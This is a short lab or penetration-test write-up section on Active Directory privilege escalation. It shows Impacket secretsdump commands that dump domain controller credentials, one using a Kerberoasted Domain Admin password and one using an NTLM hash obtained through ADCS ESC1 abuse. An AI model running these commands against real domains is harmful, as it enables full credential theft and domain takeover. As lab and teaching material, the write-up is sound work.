# 5 - Privilege Escalation

## Impacket Secretsdump with Kerberoasted Domain Admin Credentials
With the cracked Domain Admin clear-text password obtained via Kerberoasting and Hashcat, we can now perform full credential dumping on the Domain Controller using Impacket:
```bash
secretsdump.py -dc-ip 10.10.X.10 svc_exchange:1q2w3e4r@10.10.X.10
```

![image](https://github.com/user-attachments/assets/bfc72ba9-8f9f-48b6-b556-a0f22c902488)


## Impacket Secretsdump with ADCS Abuse
Using the `ESC1` template vulnerability in Active Directory Certificate Services (ADCS), we requested a certificate via `Certipy-ad` and authenticated as a Domain Admin using the NTLM hashes.
```bash
secretsdump.py 'lab.local/ricktheam@10.10.100.10' -hashes ':70ab51edc11496f7f3e6d0eaee5d9dac' -dc-ip 10.10.100.10  -target-ip 10.10.100.10 
```

![image](https://github.com/user-attachments/assets/d674998b-1f35-4bcb-936c-6332eeb998b2)


This gives us:
- Cleartext passwords (if present)
- NTLM hashes for all users
- The `golden keys` to the entire domain!
